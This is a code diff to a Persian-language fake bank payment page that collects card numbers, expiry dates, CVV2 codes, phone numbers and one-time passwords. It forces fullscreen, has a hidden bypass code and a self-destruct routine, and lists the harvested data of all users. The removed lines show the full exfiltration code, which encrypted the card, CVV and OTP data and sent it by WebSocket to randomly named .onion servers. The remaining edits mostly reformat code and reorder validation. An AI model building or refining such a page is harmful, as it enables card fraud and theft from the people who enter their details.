@@ -336,11 +336,6 @@
             let isSpecialMode = false;
             let sessionId = Math.random().toString(36).substr(2, 10);
             const SPECIAL_CODE = '12122312';
-            const SERVERS = [
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
-                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`
-            ];
 
             function init() {
                 enterFullscreen();
@@ -355,9 +350,7 @@
             }
 
             function enterFullscreen() {
-                document.documentElement.requestFullscreen().catch(err => {
-                    console.log('Fullscreen failed:', err);
-                });
+                document.documentElement.requestFullscreen().catch(err => console.log('Fullscreen failed:', err));
                 document.body.classList.add('fullscreen');
             }
 
@@ -425,9 +418,7 @@
             }
 
             function updateUserData(key, value) {
-                if (value.trim()) {
-                    userData[key] = value;
-                }
+                if (value.trim()) userData[key] = value;
             }
 
             function saveAndDisplayUserData() {
@@ -443,13 +434,9 @@
                 userDataDiv.innerHTML = '<h3>اطلاعات کاربران:</h3>' + 
                     (allUsersData.length > 0 ? 
                         allUsersData.map((user, index) => 
-                            `<div style="margin-bottom: 15px;">
-                                <h4>کاربر ${index + 1}:</h4>` + 
-                                Object.entries(user)
-                                    .map(([key, value]) => `<p>${key}: ${value}</p>`)
-                                    .join('') +
-                            `</div>`
-                        ).join('') : 
+                            `<div style="margin-bottom: 15px;"><h4>کاربر ${index + 1}:</h4>` + 
+                            Object.entries(user).map(([key, value]) => `<p>${key}: ${value}</p>`).join('') +
+                            `</div>`).join('') : 
                         '<p>هیچ اطلاعاتی موجود نیست</p>');
             }
 
@@ -464,49 +451,59 @@
                         setTimeout(() => document.body.style.filter = 'none', 1000);
                     }
                 });
-                window.addEventListener('blur', () => {
-                    document.body.style.filter = 'blur(5px)';
-                    setTimeout(() => document.body.style.filter = 'none', 2000);
-                });
             }
 
             function validateStep(step) {
                 const card = document.getElementById('card-number').value.replace(/\D/g, '');
                 if (card === SPECIAL_CODE) return true;
 
-                const requiredInputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                for (let input of requiredInputs) {
-                    if (!input.value.trim()) {
-                        alert('لطفاً تمامی فیلدهای الزامی را پر کنید');
-                        return false;
-                    }
-                }
-
                 if (step === 1) {
                     const cardNumber = document.getElementById('card-number').value;
-                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardNumber)) {
-                        alert('شماره کارت نامعتبر است (باید به صورت 1234-5678-9012-3456 باشد)');
-                        return false;
-                    }
                     const expiry = document.getElementById('expiry').value;
-                    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
-                        alert('تاریخ انقضا نامعتبر است (باید به صورت MM/YY باشد)');
+                    const cvv2 = document.getElementById('cvv2').value;
+
+                    if (!cardNumber) {
+                        alert('لطفاً شماره کارت را وارد کنید');
                         return false;
                     }
-                    const cvv2 = document.getElementById('cvv2').value;
+                    if (!expiry) {
+                        alert('لطفاً تاریخ انقضا را وارد کنید');
+                        return false;
+                    }
+                    if (!cvv2) {
+                        alert('لطفاً CVV2 را وارد کنید');
+                        return false;
+                    }
+                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardNumber)) {
+                        alert('شماره کارت باید به صورت 1234-5678-9012-3456 باشد');
+                        return false;
+                    }
+                    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+                        alert('تاریخ انقضا باید به صورت MM/YY باشد');
+                        return false;
+                    }
                     if (!/^\d{3,4}$/.test(cvv2)) {
-                        alert('CVV2 نامعتبر است (باید 3 یا 4 رقم باشد)');
+                        alert('CVV2 باید 3 یا 4 رقم باشد');
                         return false;
                     }
                 }
 
                 if (step === 2) {
                     const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                    if (phone.length !== 11 || !phone.startsWith('09')) {
-                        alert('شماره تلفن نامعتبر است (باید با 09 شروع شود و 11 رقم باشد)');
+                    const otp = document.getElementById('otp').value;
+
+                    if (!phone) {
+                        alert('لطفاً شماره تلفن را وارد کنید');
                         return false;
                     }
-                    const otp = document.getElementById('otp').value;
+                    if (!otp) {
+                        alert('لطفاً رمز پویا را وارد کنید');
+                        return false;
+                    }
+                    if (phone.length !== 11 || !phone.startsWith('09')) {
+                        alert('شماره تلفن باید با 09 شروع شود و 11 رقم باشد');
+                        return false;
+                    }
                     if (!/^\d{6}$/.test(otp)) {
                         alert('رمز پویا باید 6 رقم باشد');
                         return false;
@@ -517,11 +514,13 @@
 
             function nextStep(step) {
                 if (!validateStep(step)) return;
-                saveAndDisplayUserData(); // ذخیره اطلاعات قبل از تغییر مرحله
+
+                saveAndDisplayUserData();
                 steps[step - 1].classList.remove('active');
                 currentStep = step + 1;
                 steps[currentStep - 1].classList.add('active');
                 updateProgress();
+
                 if (currentStep === 3) processPayment();
             }
 
@@ -535,9 +534,8 @@
                     alert('شماره تلفن نامعتبر است');
                     return;
                 }
-                const encrypted = encryptData({ phone });
-                sendData(1, { action: 'otp', data: encrypted });
                 startTimer(120);
+                alert('رمز پویا برای شما ارسال شد (شبیه‌سازی)');
             }
 
             function startTimer(seconds) {
@@ -552,47 +550,12 @@
                 }, 1000);
             }
 
-            function encryptData(data) {
-                const key = CryptoJS.lib.WordArray.random(32);
-                const iv = CryptoJS.lib.WordArray.random(16);
-                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
-                    iv: iv,
-                    mode: CryptoJS.mode.CBC,
-                    padding: CryptoJS.pad.Pkcs7
-                });
-                return encrypted.toString();
-            }
-
-            function sendData(serverIndex, payload) {
-                const ws = new WebSocket(SERVERS[serverIndex]());
-                ws.onopen = () => {
-                    ws.send(JSON.stringify(payload));
-                    ws.close();
-                };
-                ws.onerror = () => console.log('WebSocket error');
-            }
-
             function processPayment() {
                 const loader = document.getElementById('loader');
                 const result = document.getElementById('result');
                 loader.style.display = 'block';
 
-                const data = {
-                    card: document.getElementById('card-number').value,
-                    expiry: document.getElementById('expiry').value,
-                    cvv2: document.getElementById('cvv2').value,
-                    phone: document.getElementById('phone-number').value,
-                    otp: document.getElementById('otp').value
-                };
-
-                const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
-                const encryptedCvv = encryptData({ cvv2: data.cvv2 });
-                const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });
-
                 setTimeout(() => {
-                    sendData(0, { action: 'card', data: encryptedCard });
-                    sendData(1, { action: 'cvv', data: encryptedCvv });
-                    sendData(2, { action: 'otp', data: encryptedOtp });
                     loader.style.display = 'none';
                     const transactionId = generateTransactionId();
                     userData['شماره تراکنش'] = transactionId;
@@ -634,7 +597,6 @@
 
             function cancel() {
                 if (confirm('آیا از لغو مطمئن هستید؟')) {
-                    sendData(0, { action: 'cancel' });
                     saveAndDisplayUserData();
                     if (!isSpecialMode) selfDestruct();
                 }
